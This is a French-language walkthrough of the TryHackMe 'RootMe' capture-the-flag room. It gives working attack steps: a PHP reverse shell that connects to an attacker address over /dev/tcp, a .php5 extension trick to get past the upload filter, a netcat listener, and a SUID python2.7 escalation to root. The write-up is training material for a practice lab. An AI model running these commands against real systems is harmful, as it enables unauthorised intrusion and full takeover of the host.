# 🧬 RootMe — Walkthrough

🔗 **Room TryHackMe :** [RootMe](https://tryhackme.com/room/rrootme)

```diff
> enumérer le web • contourner l'upload • transformer python SUID en root
```

---

## ℹ️ Informations

- **Plateforme :** TryHackMe
- **Difficulté :** débutant
- **Objectif :** obtenir un shell utilisateur, récupérer `user.txt`, escalader en `root`, puis récupérer `root.txt`
- **Services exposés :** SSH et HTTP

---

## 🧠 Reconnaissance

### Scan des ports

Un scan des ports permet d'identifier les services accessibles :

```bash
rustscan -a rootme.thm -- -sC -sV
```

Résultat important :

```text
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.41 (Ubuntu)
```

Le port `80` héberge donc une application web Apache.

![Tâche reconnaissance](screenshots/image%201.png)

👉 **Insight :**
La surface exposée est petite. Le service web devient donc rapidement la piste principale.

---

## 🌐 Enumération web

### Découverte de répertoires

On lance ensuite une recherche de répertoires :

```bash
dirsearch -u http://rootme.thm/
```

Les chemins intéressants trouvés sont :

```text
/panel/    200
/uploads/  200
```

Interprétation :

- `/panel/` contient un formulaire d'upload.
- `/uploads/` permet d'accéder aux fichiers envoyés.

Ces deux chemins donnent une piste claire : uploader un fichier malveillant, puis l'exécuter depuis `/uploads/`.

👉 **Insight :**
Quand un formulaire d'upload et un dossier public apparaissent ensemble, il faut vérifier si les fichiers envoyés peuvent être exécutés côté serveur.

---

## 🧪 Exploitation

### Reverse shell PHP

On prépare un reverse shell PHP. L'adresse IP doit être celle de la machine d'attaque sur le réseau TryHackMe :

```php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/<IP_ATTAQUANT>/4444 0>&1'"); ?>
```

On enregistre ce contenu dans un fichier :

```bash
nano php-reverse-shell.php
```

L'upload du fichier `.php` est bloqué par l'application.

![Upload PHP bloqué](screenshots/image%203.png)

### Contournement par extension

On contourne le filtre en changeant l'extension en `.php5` :

```bash
mv php-reverse-shell.php php-reverse-shell.php5
```

Cette fois, l'upload fonctionne.

Avant d'exécuter le fichier, on lance un listener sur la machine d'attaque :

```bash
nc -lvnp 4444
```

Ensuite, on visite le fichier uploadé depuis :

```text
http://rootme.thm/uploads/php-reverse-shell.php5
```

Le listener reçoit alors un shell sur la cible.

![Reverse shell obtenu](screenshots/image%204.png)

👉 **Insight :**
Les filtres d'upload bloquent souvent les extensions évidentes, pas toutes les variantes exécutables par le serveur.

---

## 🚩 Flag utilisateur

Une fois le shell obtenu, on se place dans le dossier de l'utilisateur web et on lit le flag :

```bash
cd ~
ls
cat user.txt
```

![Lecture du flag utilisateur](screenshots/image%205.png)

Le flag est ensuite validé dans TryHackMe.

![Validation du flag utilisateur](screenshots/image%202.png)

---

## ⬆️ Escalade de privilèges

### Recherche des SUID

On cherche les binaires avec le bit SUID activé :

```bash
find / -user root -perm /4000 -type f 2>/dev/null
```

Dans les résultats, un binaire ressort :

```text
/usr/bin/python2.7
```

### Shell root

Comme `python2.7` est exécutable avec les privilèges du propriétaire `root`, on peut s'appuyer sur la technique SUID documentée dans GTFOBins :

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

L'option `-p` permet de conserver les privilèges effectifs. On obtient alors un shell root.

![Shell root](screenshots/image%206.png)

👉 **Insight :**
Les binaires SUID font partie des premiers réflexes d'escalade sur Linux. GTFOBins aide à repérer rapidement comment les exploiter.

---

## 👑 Flag root

Il reste à localiser le fichier `root.txt` :

```bash
find / -type f -name root.txt 2>/dev/null
```

Puis à afficher son contenu :

```bash
cat /root/root.txt
```

![Lecture du flag root](screenshots/image%207.png)

---

## 🧠 Conclusion

Cette room met en pratique :

- l'énumération web
- le contournement de filtre d'upload
- les reverse shells PHP
- la recherche de binaires SUID
- l'escalade Linux avec GTFOBins

---

```diff
> un upload public devient une exécution de code • python SUID devient root
```

## 🔗 Références

- [TryHackMe - RootMe](https://tryhackme.com/room/rrootme)
- [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/)
- [HackTricks - Reverse Shells](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

---

Les notes brutes de résolution sont conservées dans [Notes.md](Notes.md).
